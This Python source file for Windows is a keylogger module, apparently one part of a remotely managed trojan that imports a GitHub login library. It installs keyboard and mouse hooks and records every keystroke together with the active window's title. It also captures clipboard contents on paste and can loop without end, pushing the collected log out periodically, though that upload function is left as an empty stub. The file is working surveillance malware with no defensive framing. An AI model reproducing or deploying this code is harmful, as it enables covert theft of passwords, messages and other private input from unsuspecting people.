#module to log key stroke
#windows only
#takes interval and period arguments
#interval - true to continue indefinately, false to quit after period
#period - if interval is false, run until period; if interval is true, push data after each period

import pythoncom #library for com automation (windows)
import win32event
import pyHook #library for windows input hooks
import win32clipboard
import StringIO #look into cStringIO
import time
from github3 import login

#ctypes was only used to get wondow name which we dont need
#user32 = windll.user32
#kernel32 = windll.kernel32
#psapi = windll.psapi
current_window = None
log = StringIO.StringIO()

def check_window(event):
	global log
	global current_window
	if event.WindowName != current_window:
		current_window = event.WindowName
		log.write(current_window + "\n")
	return

#callback on keystroke
def KeyStroke(event):
	global log

	#check if current window has changed
	check_window(event)

	if event.Ascii > 32 and event.Ascii < 127: #standard key
		log.write(chr(event.Ascii))
	else:
		#get clipboard if ctrl-v
		if event.Key == "V": #need to test for paste
			win32clipboard.OpenClipboard()
			pasted = win32clipboard.GetClipboardData()
			win32clipboard.CloseClipboard()

			log.write("[Paste] " + pasted + " ")
		else:
			log.write(" " + event.Key + " ")

	return True #pass execution to next hook in queue

def MouseLeft(event):
	global log
	check_window(event)
	log.write("Left mouse: " + str(event.Position) + " ")
	return True


def MouseRight(event):
	global log
	check_window(event)
	log.write("Right mouse: " + str(event.Position) + " ")
	return True

def push_data(config):
	#todo
	return

def run(config, **args):
	global log

	#argument processing
	try:
		interval = args["interval"]
	except:
		interval = False #quit after period
	try:
		period = args["period"]
	except:
		period = 3600 #1 hour

	#setup
	kl = pyHook.HookManager() #create hook manager
	kl.KeyDown = KeyStroke #register callback on keydown
	kl.MouseLeftDown = MouseLeft #register callback on mouse
	kl.MouseRightDown = MouseRight	
	kl.HookKeyboard()
	kl.HookMouse()

	if interval:
		while True:
			start = time.time()
			while time.time() - start < period:
				pythoncom.PumpWaitingMessages()
				win32event.MsgWaitForMultipleObjects([], False, 
						100, win32event.QS_ALLEVENTS)
			try:
				push_data(config)
			except:
				pass #just keep going if we cant push
	else: #msgwait timeout is in milliseconds
		while time.clock() < period:
			pythoncom.PumpWaitingMessages()
			win32event.MsgWaitForMultipleObjects([], False, 100, 
							win32event.QS_ALLEVENTS)

	#cleanup	
	data = log.getvalue()
	log.close()
	kl.UnhookMouse()
	kl.UnhookKeyboard()

	return None, data
